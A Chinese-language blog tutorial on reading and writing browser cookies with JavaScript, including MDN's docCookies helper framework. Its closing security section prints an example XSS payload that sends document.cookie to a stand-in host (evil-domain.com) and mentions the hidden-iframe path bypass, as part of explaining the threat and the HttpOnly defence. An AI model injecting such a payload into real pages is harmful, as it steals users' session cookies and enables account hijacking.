---
title: 如何操作cookie？
layout: post
tags: javascript cookie 数据缓存
category: javascript
---

* content
{:toc}

# 前言
> Cookie（复数形态Cookies），中文名称为“小型文本文件”或“小甜饼”，指某些网站为了辨别用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密）。定义于RFC2109。是网景公司的前雇员卢·蒙特利在1993年3月的发明。Cookie总是保存在客户端中，按在客户端中的存储位置，可分为内存Cookie和硬盘Cookie。内存Cookie由浏览器维护，保存在内存中，浏览器关闭后就消失了，其存在时间是短暂的。硬盘Cookie保存在硬盘里，有一个过期时间，除非用户手工清理或到了过期时间，硬盘Cookie不会被删除，其存在时间是长期的。所以，按存在时间，可分为非持久Cookie和持久Cookie。

## 用途
- 因为HTTP协议是无状态的，即服务器不知道用户上一次做了什么，这严重阻碍了交互式Web应用程序的实现。在典型的网上购物场景中，用户浏览了几个页面，买了一盒饼干和两饮料。最后结帐时，由于HTTP的无状态性，不通过额外的手段，服务器并不知道用户到底买了什么。 所以Cookie就是用来绕开HTTP的无状态性的“额外手段”之一。服务器可以设置或读取Cookies中包含信息，借此维护用户跟服务器会话中的状态。
- 在刚才的购物场景中，当用户选购了第一项商品，服务器在向用户发送网页的同时，还发送了一段Cookie，记录着那项商品的信息。当用户访问另一个页面，浏览器会把Cookie发送给服务器，于是服务器知道他之前选购了什么。用户继续选购饮料，服务器就在原来那段Cookie里追加新的商品信息。结帐时，服务器读取发送来的Cookie就行了。
- Cookie另一个典型的应用是当登录一个网站时，网站往往会请求用户输入用户名和密码，并且用户可以勾选“下次自动登录”。如果勾选了，那么下次访问同一网站时，用户会发现没输入用户名和密码就已经登录了。这正是因为前一次登录时，服务器发送了包含登录凭据（用户名加密码的某种加密形式）的Cookie到用户的硬盘上。第二次登录时，（如果该Cookie尚未到期）浏览器会发送该Cookie，服务器验证凭据，于是不必输入用户名和密码就让用户登录了。

## Cookie的缺陷
1. Cookie会被附加在每个HTTP请求中，所以无形中增加了流量。
2. 由于在HTTP请求中的Cookie是明文传递的，所以安全性成问题。（除非用HTTPS）
3. Cookie的大小限制在4KB左右。对于复杂的存储需求来说是不够用的。

# 语法
```javascript
var allCookies = document.cookie; // 读取所有cookie，获取到的allCookies是一个字符串，包含所有以分号分隔的键值对;
document.cookie = updatedCookie; // 写一个新的cookie，updatedCookie是一个键值对的字符串，只能使用这个方法一次设置或更新一个cookie;
```

## 可选的值：
- ;path=path  =>  如果没有定义，默认为当前文档位置的路径;
- ;domain=domain  => 如果没有如果没有定义，默认为当前文档位置的路径的域名部分。
- ;max-age=max-age-in-seconds (例如一年为60*60*24*365)
- ;expires=date-in-GMTString-format 如果没有定义，cookie会在对话结束时过期，这个值的格式参考Date.toUTCString() 
- ;secure (cookie只通过https协议传输) 
> cookie的值字符串可以用encodeURIComponent()来保证它不包含任何逗号、分号或空格

# 一个简单的cookie框架
```javascript
/*\
|*|
|*|  :: cookies.js ::
|*|
|*|  A complete cookies reader/writer framework with full unicode support.
|*|
|*|  https://developer.mozilla.org/en-US/docs/DOM/document.cookie
|*|
|*|  This framework is released under the GNU Public License, version 3 or later.
|*|  http://www.gnu.org/licenses/gpl-3.0-standalone.html
|*|
|*|  Syntaxes:
|*|
|*|  * docCookies.setItem(name, value[, end[, path[, domain[, secure]]]])
|*|  * docCookies.getItem(name)
|*|  * docCookies.removeItem(name[, path], domain)
|*|  * docCookies.hasItem(name)
|*|  * docCookies.keys()
|*|
\*/

var docCookies = {
  getItem: function (sKey) {
    return decodeURIComponent(document.cookie.replace(new RegExp("(?:(?:^|.*;)\\s*" + encodeURIComponent(sKey).replace(/[\-\.\+\*]/g, "\\$&") + "\\s*\\=\\s*([^;]*).*$)|^.*$"), "$1")) || null;
  },
  setItem: function (sKey, sValue, vEnd, sPath, sDomain, bSecure) {
    if (!sKey || /^(?:expires|max\-age|path|domain|secure)$/i.test(sKey)) { return false; }
    var sExpires = "";
    if (vEnd) {
      switch (vEnd.constructor) {
        case Number:
          sExpires = vEnd === Infinity ? "; expires=Fri, 31 Dec 9999 23:59:59 GMT" : "; max-age=" + vEnd;
          break;
        case String:
          sExpires = "; expires=" + vEnd;
          break;
        case Date:
          sExpires = "; expires=" + vEnd.toUTCString();
          break;
      }
    }
    document.cookie = encodeURIComponent(sKey) + "=" + encodeURIComponent(sValue) + sExpires + (sDomain ? "; domain=" + sDomain : "") + (sPath ? "; path=" + sPath : "") + (bSecure ? "; secure" : "");
    return true;
  },
  removeItem: function (sKey, sPath, sDomain) {
    if (!sKey || !this.hasItem(sKey)) { return false; }
    document.cookie = encodeURIComponent(sKey) + "=; expires=Thu, 01 Jan 1970 00:00:00 GMT" + ( sDomain ? "; domain=" + sDomain : "") + ( sPath ? "; path=" + sPath : "");
    return true;
  },
  hasItem: function (sKey) {
    return (new RegExp("(?:^|;\\s*)" + encodeURIComponent(sKey).replace(/[\-\.\+\*]/g, "\\$&") + "\\s*\\=")).test(document.cookie);
  },
  keys: /* optional method: you can safely remove it! */ function () {
    var aKeys = document.cookie.replace(/((?:^|\s*;)[^\=]+)(?=;|$)|^\s*|\s*(?:\=[^;]*)?(?:\1|$)/g, "").split(/\s*(?:\=[^;]*)?;\s*/);
    for (var nIdx = 0; nIdx < aKeys.length; nIdx++) { aKeys[nIdx] = decodeURIComponent(aKeys[nIdx]); }
    return aKeys;
  }
};
```
## 语法

```javascript
docCookies.setItem(name, value[, end[, path[, domain[, secure]]]]) //设置cookie
docCookies.getItem(name) //获取cookie
docCookies.removeItem(name[, path],domain) //删除cookie
docCookies.hasItem(name) //检测cookie
docCookies.keys() //得到所有cookie列表
```

# 安全
- 路径限制并不能阻止从其他路径访问cookie. 使用简单的DOM即可轻易地绕过限制(比如创建一个指向限制路径的, 隐藏的iframe, 然后访问其 contentDocument.cookie 属性). 保护cookie不被非法访问的唯一方法是将它放在另一个域名/子域名之下, 利用同源策略保护其不被读取.

- Web应用程序通常使用cookies来标识用户身份及他们的登录会话. 因此通过窃听这些cookie, 就可以劫持已登录用户的会话. 窃听的cookie的常见方法包括社会工程和XSS攻击：

```(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;```
- HttpOnly 属性可以阻止通过javascript访问cookie, 从而一定程度上遏制这类攻击. 参见 Cookies and Security.
